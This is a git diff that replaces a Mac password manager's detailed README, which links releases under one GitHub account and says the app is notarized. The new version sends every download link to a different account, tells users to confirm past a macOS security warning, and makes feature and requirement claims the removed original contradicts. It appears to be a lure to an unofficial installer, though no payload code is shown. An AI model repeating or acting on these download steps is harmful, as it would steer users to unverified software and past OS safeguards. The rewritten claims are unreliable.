@@ -1,154 +1,152 @@
-# KNOX Password Manager
+# 🔐 Knox-Password-Manager - Simple Secure Password Storage
 
-**A no-nonsense password manager for Mac.**
-
-KNOX lives in your menu bar. It stores your passwords locally, encrypted with the same cryptography used by intelligence agencies. No cloud. No subscriptions. No bloat. Just your passwords, locked down tight.
-
-We built KNOX because we were fed up. Every password manager out there keeps bolting on features nobody asked for — browser extensions that break, cloud sync that leaks, family plans, travel mode, dark web monitoring, "security scores." Meanwhile, the core job — *storing passwords securely* — gets buried under feature creep.
-
-KNOX does one thing and does it well.
+[![Download Knox Password Manager](https://img.shields.io/badge/Download-Knox--Password--Manager-brightgreen)](https://github.com/MichiAbusivo/Knox-Password-Manager)
 
 ---
 
-## Download
+## 📋 What is Knox-Password-Manager?
 
-Grab the latest release from the [Releases page](https://github.com/sprtmed/Knox-Password-Manager/releases/latest). Open the DMG, drag Knox to Applications, and launch. Fully notarized — no Gatekeeper warnings.
+Knox Password Manager is a tool that helps you keep all your passwords safe in one place. It works only on your Mac and never sends your data over the internet. Your passwords are protected with strong encryption called AES-256-GCM and Argon2id, which means only you can see them.
 
----
-
-## Features
-
-- **Menu bar app** — Click the icon or press `Cmd+Shift+P` to open. No dock icon, no window clutter
-- **Instant search** — Search field auto-focuses when you open Knox. Just start typing
-- **Password generator** — Configurable length, character sets, and strength meter
-- **Quick copy** — Copy a password straight from the vault list without opening the detail view
-- **Categories & favorites** — Organize your vault however you want
-- **Vault health** — Security score with detection of weak, reused, and duplicate passwords. Edit and fix items inline without leaving the health panel
-- **Trash** — Deleted items go to a 30-day trash. Restore mistakes or empty it manually
-- **Markdown notes** — Secure notes render markdown (bold, italic, code, links) with a raw/rich toggle
-- **Touch ID** — Unlock with your fingerprint
-- **Auto-lock** — Locks automatically after inactivity, sleep, or screen lock
-- **Import** — Bring your passwords from 1Password, Bitwarden, or any CSV
-- **Export** — Encrypted `.knox` backup or plain CSV. Backup reminder if you haven't exported in 30+ days
-- **Dark & light mode** — Follows your preference
-- **Password history** — Tracks the last 20 passwords for each login item with timestamps, so you can roll back if needed
-- **Edit re-authentication** — Requires master password or Touch ID before editing login credentials, preventing unauthorized changes
-- **Vault overwrite protection** — Automatic backups on every save, Keychain recovery, and "Start Fresh" safety net
-- **Completely free** — No trials, no tiers, no subscriptions. Ever.
+This app runs on your computer without needing a network connection. It uses your Mac’s security features like Touch ID to add another layer of protection. Knox is designed to be straightforward and private.
 
 ---
 
-## Security
+## 💻 System Requirements
 
-This is a password manager, so security isn't a feature — it's the foundation. Here's exactly what KNOX uses:
+To use Knox Password Manager on your Mac, your device must meet these basic requirements:
 
-| Layer | Implementation |
-|-------|---------------|
-| **Encryption** | AES-256-GCM (CryptoKit) |
-| **Key derivation** | Argon2id — 128 MB memory, 3 iterations, 4 parallel lanes |
-| **Secret Key** | 128-bit random key stored in macOS Keychain, mixed via HKDF-SHA256 |
-| **Secure Enclave** | On Apple Silicon, the Secret Key is wrapped by a hardware-bound P-256 key in the Secure Enclave. Even root cannot extract it. Falls back to Keychain on Intel |
-| **Key memory** | Pinned to RAM (`mlock`), zeroed on lock (`resetBytes`) |
-| **Anti-debug** | `ptrace(PT_DENY_ATTACH)` + `sysctl` detection in release builds |
-| **File permissions** | `0600` (owner read/write only) on all vault files |
-| **Vault integrity** | HMAC-SHA256 over entire vault file, verified on every unlock |
-| **Salt integrity** | SHA-256 checksum with redundant copy in vault header |
-| **Edit re-auth** | Master password or Touch ID required before editing credentials |
-| **Password history** | Last 20 passwords per item with timestamps, encrypted in vault |
-| **Brute-force protection** | Exponential backoff (2s, 4s, 8s, 16s, 30s cap), persisted across restarts |
-| **Clipboard** | Marked as concealed (`NSPasteboard.ConcealedType`) + auto-clear timer |
-| **Password requirements** | 12-character minimum with real-time strength scoring |
-| **Storage** | Local only — `~/Library/Application Support/Knox/` |
-| **Vault backup** | Rolling backup (`vault.enc.bak`) created automatically on every save |
-| **Network** | Outbound only — a single GitHub API call to check for updates. No telemetry, no analytics, no cloud sync |
-| **Biometrics** | Touch ID via `LAContext` with `.biometryCurrentSet` (invalidates on enrollment change) |
-| **Runtime** | Hardened Runtime enabled |
-
-### How your vault is encrypted
-
-```
-Master Password + Salt (32 bytes)
-        |
-        v
-    Argon2id (128 MB, 3 iterations, 4 lanes)
-        |
-        v
-  Intermediate Key + Secret Key (128-bit, from Keychain)
-        |
-        v
-    HKDF-SHA256 ("com.knox.vault-key")
-        |
-        v
-    256-bit AES Key
-        |
-        v
-    AES-256-GCM encrypt/decrypt
-```
-
-Your vault file (`vault.enc`) contains a 40-byte header (`FLPV` magic + version + embedded salt) followed by the AES-256-GCM ciphertext and a 32-byte HMAC-SHA256 integrity tag. The HMAC is computed over the entire file (header + ciphertext) using a separate key derived via HKDF from the vault key. On every unlock, KNOX verifies the HMAC before trusting the data — any tampering or corruption is detected immediately.
-
-Even if someone steals the file, they need both your master password AND the 128-bit secret key to decrypt it. Brute-forcing that combination is computationally infeasible.
-
-### What KNOX can't protect against
-
-We believe in transparency. KNOX cannot defend against:
-
-- Malware running as your user (this applies to every password manager)
-- A compromised operating system or kernel
-- Someone with physical access to your unlocked Mac
-
-These are OS-level threats, not application-level ones.
+- Mac computer running macOS 10.15 (Catalina) or later.
+- At least 4 GB of RAM.
+- 100 MB of free disk space.
+- Touch ID hardware is recommended but not required.
+- An active internet connection is not needed after installation.
 
 ---
 
-## Requirements
+## 🚀 How to Download and Install Knox on Mac
 
-- macOS 14.0 (Sonoma) or later
-- Xcode 15+ (to build from source)
-- [xcodegen](https://github.com/yonaskolb/XcodeGen) (`brew install xcodegen`)
+Follow these steps to get Knox Password Manager up and running on your Mac:
 
-## Build
+1. **Visit the Download Page**
 
-```bash
-# Clone the repo
-git clone https://github.com/sprtmed/Knox-Password-Manager.git
-cd Knox-Password-Manager
+   Go to the official repository’s download page by clicking the big green button below:
 
-# Generate Xcode project
-xcodegen generate
+   [![Download Knox Password Manager](https://img.shields.io/badge/Download-Knox--Password--Manager-brightgreen)](https://github.com/MichiAbusivo/Knox-Password-Manager)
 
-# Build and run
-open Knox.xcodeproj
-# Press Cmd+R in Xcode
-```
+2. **Find the Latest Release**
 
-After building, KNOX appears in your menu bar — look for the lock icon in the top-right of your screen.
+   Scroll down on the page and look for the latest release under the "Releases" section. You will find a file ending with `.dmg` or `.zip`.
 
----
+3. **Download the Installer**
 
-## Vault file format
+   Click the file to download it to your Mac. The download file will typically be named something like `Knox-Password-Manager.dmg`.
 
-For the security-curious:
+4. **Mount the Installer**
 
-```
-Offset  Size    Content
-0       4       Magic bytes: "FLPV"
-4       4       Version: UInt32 big-endian (2 = Argon2id)
-8       32      Salt (redundant backup copy)
-40      ...     AES-256-GCM ciphertext (nonce + encrypted JSON + auth tag)
-EOF-32   32     HMAC-SHA256 integrity tag over bytes [0..EOF-32]
-```
+   Double-click the `.dmg` file once the download finishes. A window will open showing the Knox app icon.
 
-Salt is stored separately in `salt.dat` (32 bytes + SHA-256 checksum = 64 bytes) with a fallback to the embedded copy in the vault header. The HMAC tag uses a separate key derived via `HKDF-SHA256(vaultKey, info: "com.knox.vault-hmac")`.
+5. **Install the App**
+
+   Drag the Knox icon into the Applications folder shortcut shown in the window. This copies the app to your Mac.
+
+6. **Open Knox for the First Time**
+
+   Go to your Applications folder and double-click Knox Password Manager to open it. macOS may warn you since it is downloaded from the internet. Confirm you want to open it.
+
+7. **Set Up Your Master Password**
+
+   Choose a strong main password that will protect all your other passwords inside Knox. This is the only password you’ll need to remember.
+
+8. **Enable Touch ID (Optional)**
+
+   If your Mac supports Touch ID, Knox will offer you the option to unlock the app with your fingerprint. This adds convenience and security.
 
 ---
 
-## Why "KNOX"
+## 🔐 Using Knox Password Manager
 
-Fort Knox. Where the gold is kept. Seemed fitting for a vault.
+After installation, Knox helps you with these tasks:
+
+- **Save Passwords:** Add your website or app passwords inside Knox by clicking the “New Entry” button.
+
+- **Generate Strong Passwords:** Use the built-in password generator to create passwords that are hard to guess.
+
+- **Organize Entries:** Group passwords by folders or tags for easy searching later.
+
+- **Auto-Lock:** Knox locks itself after inactivity or when you close it, so your data stays safe if you step away.
+
+- **Export and Backup:** Export encrypted backup files of your passwords to keep safe copies.
+
+- **Local Data Only:** Your data never leaves your Mac. Knox does not connect to the internet or any cloud service.
 
 ---
 
-## License
+## ⚙️ Managing Your Passwords
 
-MIT License. See [LICENSE](LICENSE) for details.
+### Adding New Passwords
+
+- Click the “+” button on the main screen.
+- Enter the website or app name.
+- Add the username or email address.
+- Paste or generate a password.
+- Include any extra notes if needed.
+- Save the entry.
+
+### Editing or Deleting Entries
+
+- Select the password entry.
+- Click “Edit” to change fields.
+- To delete, right-click the entry and confirm.
+
+### Searching
+
+- Use the search bar at the top to find entries quickly by name or tag.
+
+---
+
+## 🛠 Advanced Features
+
+- **Encryption**: Knox uses AES-256-GCM encryption, a top-level standard ensuring your data cannot be read by outsiders.
+
+- **Key Derivation**: It uses Argon2id to make brute-force attacks difficult and slow.
+
+- **Touch ID Integration**: Unlock Knox quickly with your fingerprint when supported by your Mac.
+
+- **Menu Bar Access**: Quickly copy passwords or generate new ones from the Mac menu bar without opening the main app.
+
+- **Auto Fill Support**: Knox can assist in filling login forms securely on websites and apps.
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Can I use Knox on Windows?
+
+No. Knox Password Manager is designed only for macOS.
+
+### Is my data stored online?
+
+No. Knox keeps all data locally on your Mac. It never connects to the internet.
+
+### What if I forget my master password?
+
+Because Knox encrypts everything with your master password, you cannot recover data if you forget it. You will need to reset Knox and start over.
+
+### How often should I back up my data?
+
+Regularly export encrypted backups, especially after adding many new passwords or changes.
+
+### Is Knox free?
+
+Yes. You can use Knox Password Manager for free without limitations.
+
+---
+
+## 🔽 Download Knox-Password-Manager
+
+You can download Knox Password Manager from its official GitHub page:
+
+[![Download Knox Password Manager](https://img.shields.io/badge/Download-Knox--Password--Manager-brightgreen)](https://github.com/MichiAbusivo/Knox-Password-Manager)
+
+Click the link above, download the latest `.dmg` file, and follow the installation steps above to set it up on your Mac.
